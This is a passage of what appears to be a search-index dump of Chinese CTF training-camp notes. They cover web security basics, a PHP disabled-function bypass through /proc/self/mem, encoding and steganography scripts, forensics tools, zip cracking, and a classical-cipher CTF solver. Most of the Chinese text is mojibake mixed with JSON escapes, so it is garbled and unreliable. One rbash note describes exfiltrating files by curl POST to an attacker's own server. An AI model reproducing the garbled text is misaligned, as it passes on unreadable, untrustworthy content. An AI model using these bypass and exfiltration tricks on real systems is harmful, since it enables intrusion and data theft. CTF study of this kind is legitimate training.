CookieåŸºç¡€ â†’ åŒæºç­–ç•¥ #   Cookie SOPç›¸æ¯”Web SOPï¼š  ä»…ä»¥domain/pathä½œä¸ºåŒæºé™åˆ¶ ä¸åŒºåˆ†ç«¯å£ ä¸åŒºåˆ†HTTP/HTTPs    ä¸‹åˆ #  CRLFæ³¨å…¥ #   \\r\\nåˆ†å‰²  Web Serverçš„è¿è¡Œæ–¹å¼ #  Apache #   é»˜è®¤prefork mode åŒä¸€ä¸ªè¿æ¥ç”¨åŒä¸€ä¸ªè¿›ç¨‹å¤„ç† mod_php  Nginx #   event-driven åŒä¸€ä¸ªè¿æ¥è¯·æ±‚ç”¨ä¸åŒçš„çº¿ç¨‹å¤„ç† php-fpm  php disabled functionç»•è¿‡ #   /proc/self/mem â†’ å¯ä»¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜ ä¿®æ”¹got å‘½ä»¤æ‰§è¡Œï¼  è®¿é—®å¤´ #   X-Forwarded-For  å¾ˆå¤šç¨‹åºå‘˜ç”¨X-Forward-Foræ¥è·å–ç”¨æˆ·IP åœ¨HTTPè¯·æ±‚å¤´ä¸­å¯ä»¥ä¼ªé€     å“åº”å¤´ #   X-XSS-Protection  ä¸€å®šç¨‹åº¦ä¸Šç¦æ­¢åå°„æ€§XSSæ”»å‡»    "},{"id":207,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day15/","title":"Day15","section":"Xman3å¤ä»¤è¥","content":"æ— çº¿æ”»é˜² #  Fake AP #  "},{"id":208,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day2/","title":"Day2","section":"Xman3å¤ä»¤è¥","content":"MISC #  0x00: Recon #   ä¿¡æ¯æœé›† â†’ ç¤¾ä¼šå·¥ç¨‹å­¦  0x01: Encode #   What is encoding? (From Stack-Overflow)  The only thing that a computer can store is bytes. To store anything in a computer, you must first encode it. An encoding is a format to represent audio, images, text, etc in bytes.    äºŒè¿›åˆ¶ç¼–ç  #    Pythonä¸­ä¸äºŒè¿›åˆ¶ç›¸å…³çš„ç±»å‹è½¬åŒ–ï¼š\n  äºŒè¿›åˆ¶å­—ç¬¦ä¸²ä¸åè¿›åˆ¶æ•´å‹å˜é‡çš„ç›¸äº’è½¬åŒ–ï¼š\n dec_integer = int(\u0026#39;110\u0026#39;,2) # or \u0026#39;0b110\u0026#39;  bin_integer = bin(6) # ç±»ä¼¼çš„ hex(6)å¯ä»¥è½¬åŒ–ä¸º16è¿›åˆ¶   PSï¼šPython3ä¸­æœ‰Bytesç±»å‹çš„æ¦‚å¿µï¼Œå¯ä»¥ç”¨äºåšä¸åŒå­—ç¬¦ä¸²ç¼–ç æ ¼å¼çš„ä¸­ä»‹ï¼Œæ¯”å¦‚ï¼š\nb\u0026#39;\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\u0026#39;.decode(\u0026#34;utf-8\u0026#34;) # é€šè¿‡æŒ‡å®šçš„æ–¹å¼è§£ç äºŒè¿›åˆ¶bytesç±»å‹æ•°æ®  \u0026#39;ä½ å¥½\u0026#39;.encode(\u0026#34;utf-8\u0026#34;) # é€šè¿‡æŒ‡å®šçš„æ–¹å¼å°†å­—ç¬¦ä¸²ç¼–ç æˆäºŒè¿›åˆ¶bytesç±»å‹æ•°æ®  b\u0026#39;HelloWorld\u0026#39;.decode() # UTF-8æ˜¯é»˜è®¤è§£ç æ–¹å¼     CTFä¸­æœ‰ASCIIç ã€äºŒç»´ç ã€å­—ç¬¦ç”»ç­‰è€ƒå¯Ÿå½¢å¼ï¼Œä¹Ÿå¯ä»¥ç”¨ä»»æ„ä¸¤ä¸ªç¬¦å·æ¥è¡¨ç¤ºï¼ˆæ¯”å¦‚ï¼štabä¸spaceã€è«æ–¯ç”µç ï¼‰ã€‚\n  Base64ç¼–ç  #   What is base64?  From Wikipedia â†’ Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. è‡ªå·±æ€»ç»“ â†’ BASE64æ˜¯ä¸€ç§å°†äºŒè¿›åˆ¶ä¸²ç¼–ç æˆå¯è§å­—ç¬¦çš„ä¸€ç§ç¼–ç æ–¹å¼ã€‚å…¶åŒºåˆ«äºæ™®é€šç¼–ç æ–¹å¼çš„æœ€å¤§ä¸åŒä¹‹å¤„æ˜¯é‡‡ç”¨6ä½ä¸€ç»„çš„ç¼–ç æ–¹å¼ $$2^{6}=64$$ ã€‚   Base64è½¬ç å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š  graph TB;\rsubgraph åŸå§‹ä¸²=\u0026gt;BASE64ä¸²\rRaw[åŸå§‹å­—ç¬¦ä¸²,æ¯”å¦‚HelloWorld]--\u0026gt;|æŒ‡å®šç¼–ç æ–¹å¼,æ¯”å¦‚ASCII|Temp(BYTESä¸²,æ¯”å¦‚0x48656c6c6f576f726c64);\rTemp--\u0026gt;|BASE64ç¼–ç |Res[BASE64è½¬ç å­—ç¬¦ä¸²,æ¯”å¦‚SGVsbG9Xb3JsZA==];\rend\rsubgraph BASE64ç¼–ç \rS1[8Né•¿åº¦çš„BYTESä¸²,æ¯”å¦‚80]--\u0026gt;|æœ«å°¾è¡¥0Padding,æ¯”å¦‚è¡¥16ä¸ª|S2[24N\u0026#39;é•¿åº¦çš„BYTESä¸²,æ¯”å¦‚96]\rS2--\u0026gt;|6ä½ä¸€ç»„BASE64ç¼–ç |S3[BASE64ç¼–ç å­—ç¬¦ä¸²]\rend\rTemp--\u0026gt;S1;S3--\u0026gt;Res   Base64çš„ç¼–ç ç»“æœå¯ä»¥ç”¨å¦‚ä¸‹æ­£åˆ™è¡¨è¾¾å¼è¡¨ç¤ºï¼ˆFrom Stack-Overflowï¼‰ï¼š\n^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$   base64 è§£ç å·¥å…·ï¼š\n  Pythonä¸­çš„Base64ç›¸å…³ç¼–ç åº“ï¼ˆpython3ä¸­è¿˜æœ‰ä¸€ä¸ªå«b85encodeï¼Œå®é™…ä¸ºå¯¹base64çš„æ‰©å±•ï¼‰\nfrom base64 import b64encode b64encode(b\u0026#34;HelloWorld\u0026#34;) # å°†Bytesç±»å‹æ•°æ®é€šè¿‡base64æ–¹å¼ç¼–ç ï¼Œè¿”å›ä¸€ä¸ªBytesç±»å‹ä¸² # è¿”å›ä¸²é€šè¿‡Pythonçš„é»˜è®¤UTF-8æ–¹å¼è§£ç å³ä¸ºbase64çš„ç¼–ç ç»“æœ  from base64 import b64decode b64decode(b\u0026#39;SGVsbG8gV29ybGQ=\u0026#39;) # å°†ä¸€ä¸ªBytesç±»å‹æ•°æ®æˆ–è€…ä¸€ä¸ªbase64å­—ç¬¦ä¸²é€šè¿‡base64æ–¹å¼è§£ç ï¼Œè¿”å›ä¸€ä¸ªBytesç±»å‹ä¸²   bashä¸­çš„base64å·¥å…·ä¸opensslå·¥å…·ï¼Œæˆ–ç›´æ¥ä½¿ç”¨å‘½ä»¤è¡Œä¸­çš„pythonå‘½ä»¤\necho HelloWorld | base64 echo SGVsbG9Xb3JsZAo= | base64 --decode # coreutils package ä¸­çš„ base64 æ¨¡å—æ¥å—ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºè¾“å…¥ # é»˜è®¤æ¨¡å¼ä¸ºç¼–ç ï¼Œ--decode é€‰é¡¹å£°æ˜æˆ– -d é€‰é¡¹å£°æ˜åï¼Œå¯¹base64è¿›è¡Œè§£ç   openssl enc -base64 \u0026lt;\u0026lt;\u0026lt; \u0026#34;HelloWorld\u0026#34; openssl enc -base64 -d \u0026lt;\u0026lt;\u0026lt; \u0026#34;SGVsbG9Xb3JsZAo=\u0026#34; # ä½¿ç”¨ openssl ç¨‹åºä¸­çš„ enc æ¨¡å—ï¼Œ æŒ‡å®š base64 è¿›è¡Œç¼–ç è§£ç ã€‚åŒbase64æ¨¡å—ï¼Œä¹Ÿä¸ºæ–‡ä»¶è¾“å…¥ã€‚ # é»˜è®¤æ¨¡å¼ä¸ºç¼–ç ï¼ˆæˆ–-eé€‰é¡¹ï¼‰ï¼Œ-dé€‰é¡¹å£°æ˜åä¸ºè§£ç ã€‚  echo HelloWorld | python -m base64 echo SGVsbG9Xb3JsZAo= | python -m base64 -d # å¯ä»¥åœ¨bashä¸­ä½¿ç”¨pythonå¯¹ç¨‹åºè¿›è¡Œç¼–ç è§£ç ï¼Œ-dé€‰é¡¹å£°æ˜åä¸ºè§£ç      Base64éšå†™\n  åŸç†ï¼šBase64åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ä¼šé¦–å…ˆæ£€æµ‹=çš„ä¸ªæ•°ï¼Œç„¶åç›´æ¥å¿½ç•¥é»˜è®¤ä¸º0çš„base64ç å°¾éƒ¨ã€‚\n  æµç¨‹ï¼šbase64 â†’ è§£ç  â†’ ç¼–ç  â†’ å‡ºç°ä¸ä¸€è‡´ä¿¡æ¯\nb64chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; with open(\u0026#39;text.txt\u0026#39;, \u0026#39;rb\u0026#39;) as f:  bin_str = \u0026#39;\u0026#39;  for line in f.readlines():  stegb64 = \u0026#39;\u0026#39;.join(line.split())  rowb64 = \u0026#39;\u0026#39;.join(stegb64.decode(\u0026#39;base64\u0026#39;).encode(\u0026#39;base64\u0026#39;).split())  offset = abs(b64chars.index(stegb64.replace(\u0026#39;=\u0026#39;,\u0026#39;\u0026#39;)[-1])-b64chars.index(rowb64.replace(\u0026#39;=\u0026#39;,\u0026#39;\u0026#39;)[-1]))  equalum = stegb64.count(\u0026#39;=\u0026#39;)  if equalum:  bin_str += bin(offset)[2:].zfill(equalum * 2)  print(\u0026#39;\u0026#39;.join([chr(int(bin_str[i:i+8], 2)) for i in xrange(0, len(bin_str), 8)]))     å…¶ä»–ç¼–ç æ–¹å¼ #    å›¾å½¢ç  â†’ åœ¨çº¿å·¥å…·\n  äºŒç»´ç ï¼šï¼ˆ1ï¼‰CTFï¼šäºŒç»´ç çš„ä¿®å¤ â†’ é»‘ç™½å–åï¼›ï¼ˆ2ï¼‰äºŒç»´ç ç»“æ„ç¤ºæ„å›¾ï¼š\n  æ”»å‡»å®è·µ #   rbashï¼ˆrestricted bashï¼‰ â†’ é™åˆ¶å‘½ä»¤ä½¿ç”¨çš„bashshell  ç›´æ¥tab â†’ æ˜¾ç¤ºå¯ç”¨çš„æ‰€æœ‰å‘½ä»¤ æ²¡æœ‰å›æ˜¾ â†’ curlå‘½ä»¤æŠŠæ–‡ä»¶poståˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š    0x02: Forensic\u0026amp;Steg éšå†™çŸ©é˜µ #  å‰ç½®æŠ€èƒ½ #    Python â†’ å­—ç¬¦ä¸²å¤„ç†ã€äºŒè¿›åˆ¶æ•°æ®å¤„ç†ã€æ–‡ä»¶å¤„ç†(Zipã€Pngã€PCAP)ã€ç½‘ç»œç¼–ç¨‹(socket, pwntools)\n  What is magic number? (From Wikipedia)\n A constant numerical or text value used to identify a file format or protocol.    Tools\n  File(Linux bash), trid(Windows cmd), ç”¨æ¥é‰´å®šæ–‡ä»¶ç±»å‹\nfile input_file # The file command attempts to classify each filesystem object (i.e., file, directory or link) that is provided to it as an argument (i.e., input)   Strings, æŸ¥çœ‹æ–‡ä»¶ä¸­çš„å¯è§å­—ç¬¦ä¸²\nstrings [OPTIONS] FILENAME # The Strings command basically prints the strings of printable characters in files.   binwalk, foremost, dd ç”¨äºåˆ†ææ–‡ä»¶ï¼Œè‡ªåŠ¨åˆ‡å‰²æ–‡ä»¶\nbinwalk image.jpg # ä½¿ç”¨ binwalk åˆ†ææ–‡ä»¶  dd if=in_image.jpg of=out_image.jpg skip=140147 bs=1 # ä½¿ç”¨ dd å‘½ä»¤åˆ†ç¦»éšè—æ–‡ä»¶ã€‚if æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼Œof æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œskip æŒ‡å®šåˆ†ç¦»å¤´ä½ç½®ï¼Œbs è®¾ç½®æ¯æ¬¡è¯»å†™å—çš„å¤§å°ä¸º 1 ä¸ªå­—èŠ‚ foremost image.jpg # ä½¿ç”¨ foremost å‘½ä»¤ç›´æ¥åˆ†ç¦»æ–‡ä»¶   Winhex, 010Editor â†’ åˆ†ææ–‡ä»¶çš„åå…­è¿›åˆ¶\n  grep, awk, å…³é”®ä¿¡æ¯çš„æ£€ç´¢æå–\n    å›¾ç‰‡å¤„ç† #    MetaData(Wikipedia: Metadata is data that provides infoemation about other data.)\n Identifiyï¼šè·å–å›¾å½¢æ–‡ä»¶çš„æ ¼å¼ä¸ç‰¹æ€§ â†’ https://www.imagemagick.org/script/escape.php strings ExifTools    å¤„ç†å›¾ç‰‡çš„Pythonåº“ï¼š\n  import PIL from image  jpgå›¾ç‰‡  æ–‡ä»¶æ ¼å¼ï¼š  æ ‡è®°ç ï¼ˆä¸¤ä¸ªå­—èŠ‚æ„æˆï¼šç¬¬ä¸€ä½0xFFï¼Œç¬¬äºŒä½ä¸åŒæœ‰ä¸åŒå«ä¹‰ï¼‰ å‹ç¼©æ•°æ®ï¼šå‰ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºåŒ…æ‹¬è¿™ä¸¤ä¸ªå­—èŠ‚çš„æ•´ä¸ªæ®µçš„é•¿åº¦   åˆ©ç”¨æ–‡ä»¶æ ¼å¼éšè—ä¿¡æ¯  åœ¨æ–‡ä»¶å°¾éƒ¨çš„App1æ•°æ®åŒºæ’å…¥ï¼ŒMagicEXIF æ¯æ®µå¼€å§‹å‰ï¼ŒCOMæ³¨é‡Š   å¸¸ç”¨å·¥å…·ï¼šJPHIDEéšå†™ï¼Œstegdetectæ£€æµ‹éšå†™   pngæ–‡ä»¶   pngæ–‡ä»¶æ ¼å¼æ„æˆ\n  åˆ©ç”¨æ–‡ä»¶æ ¼å¼éšè—ä¿¡æ¯\n æ–‡ä»¶å¤´æ’å…¥ä¿¡æ¯ â†’ ç ´åæ–‡ä»¶å¤´ï¼Œéœ€è¦ä¿®å¤ä»¥è¯†åˆ«ä¸ºpng â†’ hexdump -C ctf.png|more IDATæ®µæœ‰é•¿åº¦ä¸Šé™ï¼Œè¶…è¿‡å¡«å…¥ä¸‹ä¸€æ®µ â†’ åœ¨æ–‡ä»¶ç»“æŸåäººä¸ºåŠ å…¥IDATæ®µ â†’ ä¸æ‰“ç ´åŸå›¾ç‰‡çš„æƒ…å†µä¸‹å®ç°æ•°æ®éšå†™ IENDæ®µ LSBéšå†™ï¼šæœ€ä½æœ‰æ•ˆä½ â†’ åœ¨é¢œè‰²ç çš„æœ€åä¸€ä½åŠ å…¥ä¿¡æ¯ï¼Œè‚‰çœ¼ä¸€èˆ¬æ— æ³•è¯†åˆ«  åªé€‚ç”¨äºpngè¿™ç§æ— æŸå‹ç¼©æ‰‹æ®µï¼Œjpgçš„å‹ç¼©æ–¹å¼ä¼šæŸå¤±ä¿¡æ¯      å¸¸ç”¨å·¥å…·ï¼špngcheckï¼ŒStegsolve(å›¾ç‰‡é€šé“æŸ¥çœ‹å™¨ï¼Œå›¾ç‰‡éšå†™å¿…å¤‡)ï¼Œ010Editor\n   gifæ–‡ä»¶  gifåœ¨çº¿ç¼–è¾‘å™¨ï¼šhttp://ezgif.com/split æ—¶é—´è½´ï¼šIdentifiy -format \u0026quot;%s %T \\n\u0026quot; 100.gif åˆ†å‰²å‘½ä»¤ï¼šconvert   éŸ³é¢‘ç±»ï¼šé¢‘è°±ã€æ³¢å½¢ zipæ–‡ä»¶  zipçˆ†ç ´ â†’ ARCHPR(windows)ï¼Œfcrackzip ä¼ªåŠ å¯† â†’ ä¿®æ”¹åŠ å¯†æ ‡å¿—ä½ï¼ŒzipCenOp(æ£€æµ‹ä¼ªåŠ å¯†jarå·¥å…·) CRC32ç¢°æ’ æ˜æ–‡æ”»å‡»ï¼ˆå·²çŸ¥ä¸€æ®µåŠ å¯†ä¿¡æ¯çš„æ˜æ–‡ï¼‰ â†’ http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html   æµé‡åˆ†æ  åè®®ï¼šhttpã€httpsã€dnsã€ftp éšè—æ•°æ® æ•°æ®æå– â†’ æ‰‹å·¥æå–ï¼šPython(pcapy)ã€Tshark(-r **.pcap -Y ** -T fields -e **) usbé”®é¼ æ•°æ®æå– å·¥å…·ï¼špcapfix(æ–‡ä»¶ä¿®å¤)ã€wireshark(åè®®åˆ†æ)ã€tshark(æ•°æ®æå–)ã€xxd(æŠŠäºŒè¿›åˆ¶æµæ‰“åŒ…æˆæ–‡ä»¶)ã€egrep   å†…å­˜æ–‡ä»¶  Volatility â†’ è¿›ç¨‹ã€æ–‡ä»¶ã€ç”¨æˆ·    0x03: Take a Look #    About Python â†’ pycæ–‡ä»¶ â†’ disæ¨¡å—è¯»å–æŒ‡ä»¤\n Python3.6ä»¥ä¸Šçš„æ–‡ä»¶DeadZoneæ— å‚æŒ‡ä»¤ä¹Ÿä¼šå ç”¨ä¸€ä¸ªå­—èŠ‚çš„å‚æ•°ç©ºé—´ Sandbox Escape â†’ pysandbox â†’ pythonæ²™ç®±çš„æ„é€     pdféšå†™(wbStego4)ã€htmléšå†™\n  ç£ç›˜æ–‡ä»¶ã€ç³»ç»Ÿé•œåƒ\n å–è¯å·¥å…·ï¼šEasyRecoveryã€FTKã€TSK    è§†é¢‘æ–‡ä»¶ï¼Œå­—å¹•æ”»å‡»\n  å·¥æ§ï¼šåè®®\n  0x04: Misc+ #  "},{"id":209,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day3/","title":"Day3","section":"Xman3å¤ä»¤è¥","content":"å¯†ç å­¦Day1 #  å¯†ç å­¦ç®€ä»‹ #   ä¸€èˆ¬æ¥è¯´ï¼Œå¯†ç å­¦çš„è®¾è®¡è€…æ ¹æœ¬ç›®æ ‡æ˜¯ä¿éšœä¿¡æ¯ä»¥åŠä¿¡æ¯ç³»ç»Ÿçš„ä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„ç‰¹æ€§ï¼š  æœºå¯†æ€§ï¼ˆConfidentialityï¼‰ã€å®Œæ•´æ€§ï¼ˆIntegrityï¼‰ã€å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰ã€è®¤è¯æ€§ï¼ˆAuthenticationï¼‰ã€ä¸å¯å¦è®¤æ€§ï¼ˆNon-repudiationï¼‰ å‰ä¸‰è€…åˆè¢«ç§°ä¸ºä¿¡æ¯å®‰å…¨çš„CIAä¸‰è¦ç´    ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬éƒ½ä¼šå‡è®¾æ”»å‡»è€…å·²çŸ¥å¾…ç ´è§£çš„å¯†ç ä½“åˆ¶ï¼Œè€Œæ”»å‡»ç±»å‹é€šå¸¸åˆ†ä¸ºä»¥ä¸‹å››ç§ï¼š  å”¯å¯†æ–‡æ”»å‡»ï¼šåªæ‹¥æœ‰å¯†æ–‡ å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼šæ‹¥æœ‰å¯†æ–‡ä¸å¯¹åº”çš„æ˜æ–‡ é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼šæ‹¥æœ‰åŠ å¯†æƒé™ï¼Œèƒ½å¤Ÿå¯¹æ˜æ–‡åŠ å¯†åè·å¾—ç›¸åº”å¯†æ–‡ é€‰æ‹©å¯†æ–‡æ”»å‡»ï¼šæ‹¥æœ‰è§£å¯†æƒé™ï¼Œèƒ½å¤Ÿå¯¹å¯†æ–‡è§£å¯†åè·å¾—å“åº”æ˜æ–‡    å¤å…¸å¯†ç  #  å•è¡¨ä»£æ¢åŠ å¯† #   ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ¥è¿›è¡Œç ´è§£ï¼š  åœ¨å¯†é’¥ç©ºé—´è¾ƒå°çš„æƒ…å†µä¸‹ï¼Œé‡‡ç”¨æš´åŠ›ç ´è§£çš„æ–¹å¼ã€‚ åœ¨å¯†æ–‡é•¿åº¦è¶³å¤Ÿé•¿çš„æ—¶å€™ä½¿ç”¨è¯é¢‘åˆ†æã€‚   åˆ†ç±»ï¼šå‡¯æ’’å¯†ç ã€ç§»ä½å¯†ç ã€AtbashCipherã€ç®€å•æ›¿æ¢å¯†ç ã€ä»¿å°„å¯†ç ã€‚ä¸‹é¢å…³äºä»¿å°„å¯†ç ï¼š  ä»¿å°„å¯†ç  #   ä»¿å°„å¯†ç çš„åŠ å¯†å‡½æ•°æ˜¯ï¼š$$ E(x) = (ax+b) \\mod m $$ã€‚å…¶ä¸­ï¼š  xÂ è¡¨ç¤ºæ˜æ–‡æŒ‰ç…§æŸç§ç¼–ç å¾—åˆ°çš„æ•°å­— ã€‚ aä¸mäº’è´¨ã€‚ mæ˜¯ç¼–ç ç³»ç»Ÿä¸­å­—æ¯çš„æ•°ç›®ã€‚   ä»¿å°„å¯†ç çš„è§£å¯†å‡½æ•°æ˜¯ï¼š$$ D(x) = a^{-1}*(x-b) \\mod m $$ã€‚å…¶ä¸­ï¼š  $$a^{-1}$$ æ˜¯ a åœ¨ç¾¤ $$\\mathbb{Z}_{m}$$ çš„ä¹˜æ³•é€†å…ƒã€‚    å¤šè¡¨ä»£æ¢åŠ å¯† #    Polybiusï¼ˆæ£‹ç›˜å¯†ç ï¼‰ â†’ å°†ç»™å®šçš„æ˜æ–‡åŠ å¯†ä¸ºä¸¤ä¸¤ç»„åˆçš„æ•°å­—ã€‚\n  Vigenereï¼ˆç»´å‰å°¼äºšå¯†ç ï¼‰ â†’ ç»´å‰å°¼äºšå¯†ç çš„ç ´è§£\n  Hillï¼ˆå¸Œå°”å¯†ç ï¼‰ â†’ å°†ç»™å®šçš„æ˜æ–‡ç¼–ç è½¬åŒ–ä¸ºnç»´å‘é‡ï¼Œè·Ÿä¸€ä¸ª n Ã— n çš„çŸ©é˜µç›¸ä¹˜ï¼Œå†å°†å¾—å‡ºçš„ç»“æœå¯¹å­—ç¬¦é›†å¤§å°Nå–æ¨¡ã€‚\n Noticeï¼šç”¨ä½œåŠ å¯†çš„çŸ©é˜µï¼ˆå¯†åŒ™ï¼‰åœ¨ $$\\mathbb{Z}_{26}^{n}$$ å¿…é¡»æ˜¯å¯é€†çš„ï¼Œä¹Ÿå°±æ˜¯è¯´çŸ©é˜µçš„è¡Œåˆ—å¼ä¸Näº’è´¨ã€‚    AutokeyCipherï¼ˆè‡ªåŠ¨å¯†é’¥å¯†ç ï¼‰ â†’ ä¸ç»´å‰å°¼äºšå¯†ç ç±»ä¼¼ï¼Œä½†ä½¿ç”¨ä¸åŒçš„æ–¹æ³•ç”Ÿæˆå¯†é’¥ã€‚\n  å…¶ä»–å¤å…¸åŠ å¯† #    åŸ¹æ ¹å¯†ç  â†’ ä½¿ç”¨ä¸¤ç§ä¸åŒçš„å­—ä½“ï¼Œä»£è¡¨ 0 å’Œ 1ï¼Œç»“åˆåŠ å¯†è¡¨è¿›è¡ŒåŠ è§£å¯†ã€‚\n  æ …æ å¯†ç ï¼ˆåˆ†ç»„é‡ç»„ï¼‰ã€æ›²è·¯å¯†ç ã€åˆ—ç§»ä½å¯†ç ã€01248å¯†ç ï¼ˆäº‘å½±å¯†ç ï¼‰ã€JSFuckã€çŒªåœˆå¯†ç ã€èˆåŠ¨çš„å°äººå¯†ç ï¼ˆå‡ºè‡ªç¦å°”æ‘©æ–¯æ¢æ¡ˆé›†ï¼‰ã€é”®ç›˜å¯†ç \n  PostScriptï¼šè‡ªå·±æ€»ç»“ï¼Œåœ¨åˆ†ææ—¶ç•¥å»å­—ç¬¦åˆ°æ•°å­—çš„ç¼–ç è¿‡ç¨‹ï¼Œç›´æ¥ä½¿ç”¨æ•°å­—è¿›è¡Œåˆ†æï¼Œèƒ½ç®€åŒ–å¤§é‡æ€è€ƒ\n  ç»ƒä¹ é¢˜ç›® #    2017 SECCON Vigenere3d\n  å…³äºæ­¤é¢˜çš„åˆ†æï¼š\n  è€ƒè™‘åˆ°åœ¨ç¨‹åºæ­£å¸¸è¿è¡Œä¸‹ï¼Œæ•°ç»„è®¿é—®ä¸ä¼šè¶Šç•Œï¼Œæˆ‘ä»¬åœ¨è®¨è®ºæ—¶åšä»¥ä¸‹çº¦å®šï¼š$$ arr[index] \\Leftrightarrow arr[index % len(arr)] $$\n  å…³äºpythonç¨‹åºä¸­å®šä¹‰çš„ _l å‡½æ•°ï¼Œå‘ç°ä»¥ä¸‹ç­‰ä»·å…³ç³»ï¼š$$ _l(offset, arr)[index] \\Leftrightarrow arr[index + offset] $$\n  å…³äºpythonçš„mainå‡½æ•°ä¸­ä¸‰ç»´çŸ©é˜µtçš„å®šä¹‰ï¼Œå‘ç°ä»¥ä¸‹ç­‰ä»·å…³ç³»ï¼š$$ t[a][b][c] \\Leftrightarrow _l(a+b, s)[c] $$\n  ç»¼åˆç¬¬2ç¬¬3ç‚¹çš„è§‚å¯Ÿï¼Œæœ‰å¦‚ä¸‹ç­‰ä»·å…³ç³»ï¼š$$ t[a][b][c] \\Leftrightarrow s[a+b+c] $$\n  æˆ‘ä»¬å°†sè§†ä¸ºä¸€ç§ç¼–ç æ ¼å¼ï¼Œå³ï¼šç¼–ç è¿‡ç¨‹s.find(x)ï¼Œè§£ç è¿‡ç¨‹sã€‚å¹¶ç›´æ¥ä½¿ç”¨å…¶ç¼–ç ç»“æœçš„æ•°å­—æ›¿ä»£å…¶æ‰€ä»£æŒ‡çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆåŠ å¯†è¿‡ç¨‹å¯ä»¥ç”¨ä»¥ä¸‹å…¬å¼è¡¨ç¤ºï¼š\n $$ e = f + k1 +k2 $$ å…¶ä¸­ï¼Œeæ˜¯å¯†æ–‡ï¼Œfæ˜¯æ˜æ–‡ï¼Œk1ä¸k2æ˜¯é€šè¿‡å¤åˆ¶æ–¹æ³•å¾—åˆ°ã€ä¸fé•¿åº¦ä¸€æ ·çš„å¯†é’¥ï¼ŒåŠ æ³•æ˜¯å‘é‡åŠ ã€‚      æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é€šè¿‡è®¡ç®— k1+k2 ï¼Œæ¨¡æ‹Ÿå¯†é’¥ï¼Œå³å¯è§£å¯†ã€‚å…³äºæ­¤é¢˜çš„è§£å¯†pythonè„šæœ¬ï¼š\nenc_str = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\u0026#39; dec_dic = {k:v for v,k in enumerate(enc_str)} encrypt = \u0026#39;POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9\u0026#39; flag_bg = \u0026#39;SECCON{**************************}\u0026#39;  sim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(7)] # ç ´è§£æ¨¡æ‹Ÿå¯†é’¥ sim_key = sim_key + sim_key[::-1]  flag_ed = [dec_dic[v]-sim_key[k%14] for k,v in enumerate(encrypt)] # æ¨¡æ‹Ÿå¯†é’¥è§£å¯† flag_ed = \u0026#39;\u0026#39;.join([enc_str[i%len(enc_str)] for i in flag_ed]) # è§£ç  print(flag_ed)   æµå¯†ç  #    é€å­—èŠ‚æˆ–è€…é€æ¯”ç‰¹å¤„ç†ä¿¡æ¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼š\n æµå¯†ç å¯†é’¥é•¿åº¦ä¸æ˜æ–‡é•¿åº¦ç›¸åŒã€‚ æµå¯†ç æ´¾ç”Ÿè‡ªä¸€ä¸ªè¾ƒçŸ­çš„å¯†é’¥ï¼Œæ´¾ç”Ÿç®—æ³•é€šå¸¸ä¸ºä¸€ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ã€‚    æµå¯†ç çš„å…³é”®åœ¨äºè®¾è®¡å¥½çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„åŸºæœ¬æ„é€ æ¨¡å—ä¸ºåé¦ˆç§»ä½å¯„å­˜å™¨ã€‚ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰ï¼Œä¾èµ–äºåˆå§‹å€¼ï¼ˆä¹Ÿç§°ç§å­ï¼‰\n åˆ†ç±»ï¼šçº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼ˆLCGï¼‰ã€çº¿æ€§å›å½’ç”Ÿæˆå™¨\u0026hellip;    ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ #    ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆpseudorandom number generatorï¼ŒPRNGï¼‰ï¼Œåˆç§°ä¸ºç¡®å®šæ€§éšæœºä½ç”Ÿæˆå™¨ï¼ˆdeterministic random bit generatorï¼ŒDRBGï¼‰ï¼Œæ˜¯ç”¨æ¥ç”Ÿæˆæ¥è¿‘äºç»å¯¹éšæœºæ•°åºåˆ—çš„æ•°å­—åºåˆ—çš„ç®—æ³•ã€‚\n  éšæœºæ€§çš„ä¸¥æ ¼æ€§ï¼š\n 